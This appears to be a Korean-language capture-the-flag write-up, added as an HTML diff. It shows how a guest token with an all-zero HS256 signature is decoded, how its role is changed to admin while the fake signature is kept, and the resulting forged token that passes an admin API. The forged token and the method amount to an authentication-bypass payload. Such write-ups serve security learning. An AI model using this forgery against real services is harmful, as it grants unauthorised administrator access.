@@ -1,0 +1,19 @@
+<h3><br>문제설명:</h3>
+<p>발급되는 샘플 토큰의 구조를 그대로 화면에 보여주는 포털이다. <br><br></p>
+<h3>목표:</h3>
+<p>서명을 스스로 만든 토큰으로 관리자 API를 통과하라 <br><br>페이지에&nbsp;들어가면&nbsp;발급권한이&nbsp;guest인&nbsp;토큰이&nbsp;보인다. <br>그대로&nbsp;디코딩해보면&nbsp;다음과&nbsp;같은&nbsp;결과가&nbsp;나온다.</p>
+<p>&nbsp;</p>
+<p>헤더:</p>
+<pre><code>{
+  "alg": "HS256"
+}</code></pre>
+<p><br>페이로드:</p>
+<pre><code>{
+  "username": "guest",
+  "role": "guest"
+}</code></pre>
+<p><br><br>서명:</p>
+<pre><code>0000000000000000000000000000000000000000000000000000000000000000</code></pre>
+<p><br><br>즉,&nbsp;올바른&nbsp;서명이&nbsp;없다고&nbsp;볼&nbsp;수&nbsp;있다. <br>따라서&nbsp;페이로드의&nbsp;role만&nbsp;바꿔줄수도&nbsp;있을것&nbsp;같다. <br>형식을&nbsp;똑같이해서&nbsp;role만&nbsp;admin으로&nbsp;바꾸면&nbsp; <br><br>•&nbsp;헤더&nbsp;(HS256&nbsp;유지):&nbsp;eyJhbGciOiAiSFMyNTYifQ== <br>•&nbsp;페이로드&nbsp;(admin&nbsp;주입):&nbsp;eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0= <br>•&nbsp;서명&nbsp;(0&nbsp;64개&nbsp;유지):&nbsp;0000000000000000000000000000000000000000000000000000000000000000 <br><br><br>아래와&nbsp;같은&nbsp;토큰을&nbsp;얻을&nbsp;수&nbsp;있다.</p>
+<pre><code>eyJhbGciOiAiSFMyNTYifQ==.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0=.0000000000000000000000000000000000000000000000000000000000000000</code></pre>
+<p><br><br>해결</p>
